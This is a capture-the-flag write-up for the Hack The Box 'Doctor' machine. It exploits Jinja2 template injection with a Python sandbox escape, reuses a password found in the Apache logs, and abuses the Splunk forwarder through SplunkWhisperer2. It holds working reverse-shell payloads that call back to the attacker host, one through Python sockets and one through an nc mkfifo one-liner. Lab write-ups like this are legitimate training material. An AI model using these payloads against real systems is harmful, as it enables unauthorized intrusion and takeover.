@@ -1,0 +1,100 @@
+[+] doctors.htb – Doctor Secure Messaging
+
+[*] <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+
+[+] Registered as limeternity@doctors.htb:limeternity@doctors.htb
+
+[*] Werkzeug/1.0.1 Python/3.8.2
+
+[*] Probably, template injection.
+
+[+] Post titles are stored in /archive.
+
+[+] Title {{7*7}} evaluates to 49 in /archive. Seems like a Jinja2 template engine.
+
+[*] Writing a program to forward payloads.
+
+[+] Look at this! Awesome.
+
+limitedeternity$ python3 interpret.py
+
+>>> 7+7
+14
+
+[*] Now, for the real deal. Let's dump all used classes:
+
+>>> [].__class__.__base__.__subclasses__()
+
+[*] Copy everything to subclasses.txt. Then: 
+
+$ cat subclasses.txt | sed 's/</"</g' | sed 's/>/>"/g'
+
+[*] And now we are ready to import this list into the Python interpreter.
+
+$ python3
+>>> subclasses = [...]
+
+[*] As we can see from "<class 'sqlite3.Row'>", the backend DBMS is SQLite3.
+
+[*] We need to find a function that:
+
+- is inside a module
+- doesn't accept any arguments (for convenience)
+
+[+] warnings.catch_warnings is an ideal candidate.
+
+[*] Next:
+
+>>> from warnings import catch_warnings
+>>> catch_warnings().__dict__
+{'_record': False, '_module': <module 'warnings' from '/usr/local/Cellar/python@3.8/3.8.5/Frameworks/Python.framework/Versions/3.8/lib/python3.8/warnings.py'>, '_entered': False}
+>>> catch_warnings()._module.__dict__
+{'__name__': 'warnings', ..., '__builtins__': {..., '__import__': <built-in function __import__>, ...}, ...}
+>>> catch_warnings()._module.__builtins__["__import__"]("os")
+<module 'os' from '/usr/local/Cellar/python@3.8/3.8.5/Frameworks/Python.framework/Versions/3.8/lib/python3.8/os.py'>
+>>> subclasses.index("<class 'warnings.catch_warnings'>")
+185
+>>> exit()
+
+[*] We are ready. Don't forget to fire up the netcat listener.
+
+limitedeternity$ nc -lvp 4242
+
+limitedeternity$ python3 interpret.py
+
+>>> [].__class__.__base__.__subclasses__().pop(185)()._module.__builtins__["__import__"]("os").popen('python3 -c \'import pty,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.75",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'')
+
+Connection from 10.10.10.209:44274
+web@doctor:~$
+
+[+] We are here.
+
+web@doctor:~$ id
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+web@doctor:~$ cd /var/log/apache2
+web@doctor:/var/log/apache2$ grep "password" -R .
+> "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+web@doctor:/var/log/apache2$ su shaun
+su shaun
+Password: Guitar123
+
+shaun@doctor:/var/log/apache2$
+
+[+] Ez. linpeas.sh showed the following:
+
+> splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
+
+[+] So: https://github.com/cnotin/SplunkWhisperer2
+
+limitedeternity$ nc -lvp 4243
+
+limitedeternity$ python PySplunkWhisperer2_remote.py --lhost 10.10.14.75 --host 10.10.10.209 --username shaun --password Guitar123 --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.75 4243 >/tmp/f' 
+
+Connection from 10.10.10.209:42948
+/bin/sh: 0: can't access tty; job control turned off
+#
+
+[+] Done.
+
+
+
